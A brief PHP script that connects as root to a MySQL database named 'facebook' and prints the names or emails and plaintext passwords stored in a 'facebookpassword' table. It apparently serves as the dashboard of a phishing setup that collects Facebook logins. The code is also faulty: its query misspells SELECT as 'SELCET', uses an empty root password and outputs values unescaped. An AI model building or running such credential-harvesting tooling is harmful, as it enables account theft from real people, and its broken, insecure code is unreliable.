<?php
$host="localhost";
$user="root";
$pass="";
$dbname="facebook";
$conn=mysqli_connect($host,$user,$pass,$dbname);
if($conn)
{
	echo "successfully";
}
else{
	echo"error db";
}
?>
<?php
$query="SELCET * FROM facebookpassword";
$data=mysqli_query($conn,$query);
$total=mysqli_num_rows($data);
if($total!=0)
{
?>

<table>
	<tr>
		<th>email/name</th>
		<th>password</th>
</tr>
<?php 
while($result=mysqli_fetch_assoc($data))
{
	echo "<tr>  
	<td>".$result['name']."</td>
	<td>".$result['password']."</td>
	</tr>";
}
}
else{
	echo "no record found";

}
?>
</table>
